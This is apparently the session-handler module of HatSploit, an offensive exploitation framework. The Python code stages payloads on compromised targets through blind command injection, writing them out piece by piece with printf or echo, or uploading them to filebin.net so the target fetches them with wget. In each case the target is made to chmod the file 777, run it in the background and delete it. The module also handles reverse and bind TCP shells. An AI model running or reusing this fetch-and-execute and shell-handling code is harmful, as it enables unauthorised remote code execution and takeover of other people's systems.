#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import requests
import binascii

from hatsploit.lib.sessions import Sessions
from hatsploit.lib.storage import LocalStorage
from hatsploit.core.cli.badges import Badges
from hatsploit.lib.modules import Modules
from hatsploit.lib.jobs import Jobs
from hatsploit.lib.server import Server

from hatsploit.lib.session import Session
from hatsploit.utils.telnet import TelnetClient


class HatSploitSession(Session, TelnetClient):
    client = None

    details = {
        'Platform': "",
        'Type': "shell"
    }

    def open(self, client):
        self.client = self.open_telnet(client)

    def close(self):
        self.client.disconnect()

    def send_command(self, command, output=False, timeout=10):
        output = self.client.send_command(command + '\n', output, timeout)
        return output

    def interact(self):
        self.client.interact()


class Handler(Server):
    sessions = Sessions()
    local_storage = LocalStorage()
    modules = Modules()
    jobs = Jobs()
    badges = Badges()

    def blinder(self, sender, args=[]):
        self.print_empty()
        self.print_information("Welcome to Blinder, blind command injection handler.")
        self.print_information("Blinder is not a reverse shell, just a blind command injection.")
        self.print_empty()

        while True:
            command = self.input_empty("blinder > ")
            if not command.strip() or command == 'exit':
                return

            self.print_process("Sending command to target...")
            output = sender(*args, command)
            if output:
                self.print_empty(f'\n{output}')
            self.print_empty('')

    def listen_session(self, local_host, local_port, timeout=None, session=HatSploitSession):
        try:
            client, address = self.listen(local_host, local_port, timeout)
            session = session()
            session.open(client)
            return session, address
        except Exception:
            self.badges.print_error("Failed to handle session!")
            return None, None

    def connect_session(self, remote_host, remote_port, timeout=None, session=HatSploitSession):
        try:
            client = self.connect(remote_host, remote_port, timeout)
            session = session()
            session.open(client)
            return session
        except Exception:
            self.badges.print_error("Failed to handle session!")
            return None

    def bytes_to_octal(self, bytes_obj):
        byte_octals = []
        for byte in bytes_obj:
            byte_octal = '\\' + oct(byte)[2:]
            byte_octals.append(byte_octal)
        return ''.join(byte_octals)

    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';',
                   location='/tmp'):
        self.badges.print_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        wget_bin = binascii.hexlify(os.urandom(8)).decode()
        wget_file = binascii.hexlify(os.urandom(8)).decode()
        
        wget_container = f"https://dev.filebin.net/{wget_bin}"
        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"

        wget_stream = "wget '{}' -qO {}"

        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
        self.badges.print_process("Uploading payload...")

        self.badges.print_process("Executing payload...")
        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}"
        args = args if args is not None else ""

        sender(*args, {command})
        requests.delete(wget_container)

    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';',
                   location='/tmp', linemax=100):
        self.badges.print_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        echo_stream = "echo -en '{}' >> {}"
        echo_max_length = linemax

        size = len(payload)
        num_parts = int(size / echo_max_length) + 1

        for i in range(0, num_parts):
            current = i * echo_max_length
            block = self.bytes_to_octal(payload[current:current + echo_max_length])
            if block:
                command = echo_stream.format(block, path)

                self.badges.print_multi(f"Uploading payload... ({str(current)}/{str(size)})")
                sender(*args, command)

        self.badges.print_process("Executing payload...")
        args = args if args is not None else ""

        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
    
    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
                     location='/tmp', linemax=100):
        self.badges.print_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        printf_stream = "printf '{}' >> {}"
        printf_max_length = linemax

        size = len(payload)
        num_parts = int(size / printf_max_length) + 1

        for i in range(0, num_parts):
            current = i * printf_max_length
            block = self.bytes_to_octal(payload[current:current + printf_max_length])
            if block:
                command = printf_stream.format(block, path)

                self.badges.print_multi(f"Uploading payload... ({str(current)}/{str(size)})")
                sender(*args, command)

        self.badges.print_process("Executing payload...")
        args = args if args is not None else ""

        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")

    def set_session_details(self, payload, session):
        if not session.details['Type']:
            session.details['Type'] = 'custom'

        session.details['Platform'] = payload['Platform']
        return session

    def do_job(self, name, payload, target, args):
        if payload['Type'].lower() == 'one_side':
            target(*args)
        else:
            module = self.modules.get_current_module_name()
            if module:
                module_name = module
            else:
                module_name = 'handler'

            self.jobs.create_job(
                name,
                module_name,
                target,
                args
            )

    def handle_session(self, host, port, payload, sender=None, args=[],
                       delim=';', remote_host=None, location='/tmp', timeout=None,
                       method=None, post="printf", linemax=100):
        if payload['Payload'] is None:
            self.badges.print_error("Payload stage is not found!")
            return False

        if sender is not None:
            session = payload['Session'] if payload['Session'] is not None else HatSploitSession
            if payload['Category'].lower() == 'stager':
                if post.lower() == 'printf':
                    self.do_job(
                        "Handler printf Stage",
                        payload,
                        self.printf_stage,
                        [
                            payload['Payload'],
                            sender,
                            args,
                            payload['Args'],
                            delim,
                            location,
                            linemax
                        ]
                    )
                elif post.lower() == 'echo':
                    self.do_job(
                        "Handler echo Stage",
                        payload,
                        self.echo_stage,
                        [
                            payload['Payload'],
                            sender,
                            args,
                            payload['Args'],
                            delim,
                            location,
                            linemax
                        ]
                    )
                elif post.lower() == 'wget':
                    self.do_job(
                        "Handler wget Stage",
                        payload,
                        self.wget_stage,
                        [
                            payload['Payload'],
                            sender,
                            args,
                            payload['Args'],
                            delim,
                            location
                        ]
                    )
                else:
                    self.print_warning("Invalid post method, using printf by default.")
                    self.do_job(
                        "Handler printf Stage",
                        payload,
                        self.printf_stage,
                        [
                            payload['Payload'],
                            sender,
                            args,
                            payload['Args'],
                            delim,
                            location,
                            linemax
                        ]
                    )
            elif payload['Category'].lower() == 'single':
                self.badges.print_process("Sending payload stage...")
                self.do_job(
                    "Handler Stage",
                    payload,
                    sender,
                    [*args, payload['Payload']]
                )
                self.badges.print_process("Executing payload...")
            else:
                self.badges.print_error("Invalid payload category!")
                return False
        else:
            if method is not None:
                encode = True
                if method.lower() == 'reverse_tcp':
                    new_session, new_remote_host = self.listen_session(host, port, timeout, HatSploitSession)
                    if not new_session and not new_remote_host:
                        return False

                if method.lower() == 'bind_tcp':
                    new_session = self.connect_session(host, port, timeout, HatSploitSession)
                    new_remote_host = host
                    if not new_session:
                        return False

                if payload['Category'].lower() == 'stager':
                    if post.lower() == 'printf':
                        self.do_job(
                            "Handler printf Stage",
                            payload,
                            self.printf_stage,
                            [
                                payload['Payload'],
                                new_session.send_command,
                                args,
                                payload['Args'],
                                delim,
                                location,
                                linemax
                            ]
                        )
                    elif post.lower() == 'echo':
                        self.do_job(
                            "Handler echo Stage",
                            payload,
                            self.echo_stage,
                            [
                                payload['Payload'],
                                new_session.send_command,
                                args,
                                payload['Args'],
                                delim,
                                location,
                                linemax
                            ]
                        )
                    elif post.lower() == 'wget':
                        self.do_job(
                            "Handler wget Stage",
                            payload,
                            self.wget_stage,
                            [
                                payload['Payload'],
                                new_session.send_command,
                                args,
                                payload['Args'],
                                delim,
                                location
                            ]
                        )
                    else:
                        self.print_warning("Invalid post method, using printf by default.")
                        self.do_job(
                            "Handler printf Stage",
                            payload,
                            self.printf_stage,
                            [
                                payload['Payload'],
                                new_session.send_command,
                                args,
                                payload['Args'],
                                delim,
                                location,
                                linemax
                            ]
                        )
                elif payload['Category'].lower() == 'single':
                    self.badges.print_process("Sending payload stage...")
                    self.do_job(
                        "Handler Stage",
                        payload,
                        new_session.send_command,
                        [payload['Payload']]
                    )
                    self.badges.print_process("Executing payload...")
                else:
                    self.badges.print_error("Invalid payload category!")
                    return False
            else:
                self.badges.print_error("Failed to execute payload stage!")
                return False

        session = payload['Session'] if payload['Session'] is not None else HatSploitSession

        if payload['Type'].lower() == 'reverse_tcp':
            new_session, new_remote_host = self.listen_session(host, port, timeout, session)
            if not new_session and not new_remote_host:
                return False

        if payload['Type'].lower() == 'bind_tcp':
            new_session = self.connect_session(host, port, timeout, session)
            new_remote_host = host
            if not new_session:
                return False

        if payload['Type'].lower() == 'one_side':
            self.badges.print_warning("Payload completed but no session was opened.")
            return True

        new_session = self.set_session_details(payload, new_session)
        session_platform = new_session.details['Platform']
        session_type = new_session.details['Type']

        if not remote_host:
            remote_host = new_remote_host
        session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
        self.badges.print_success("Session " + str(session_id) + " opened!")
        return True
